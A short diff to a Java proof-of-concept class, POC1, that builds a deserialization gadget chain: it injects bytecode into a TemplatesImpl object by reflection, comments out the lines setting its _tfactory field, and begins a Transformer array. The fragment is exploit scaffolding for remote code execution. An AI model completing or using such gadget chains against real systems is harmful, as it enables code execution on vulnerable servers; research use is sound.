@@ -51,9 +51,9 @@ public class POC1 {
         byte[][] codes = {code};
         bytecodes.set(templates,codes);
 
-        Field tfactory = aClass.getDeclaredField("_tfactory");
-        tfactory.setAccessible(true);
-        tfactory.set(templates,new TransformerFactoryImpl());
+//        Field tfactory = aClass.getDeclaredField("_tfactory");
+//        tfactory.setAccessible(true);
+//        tfactory.set(templates,new TransformerFactoryImpl());
 
 //        templates.newTransformer();
         Transformer[] transformers = new Transformer[]{
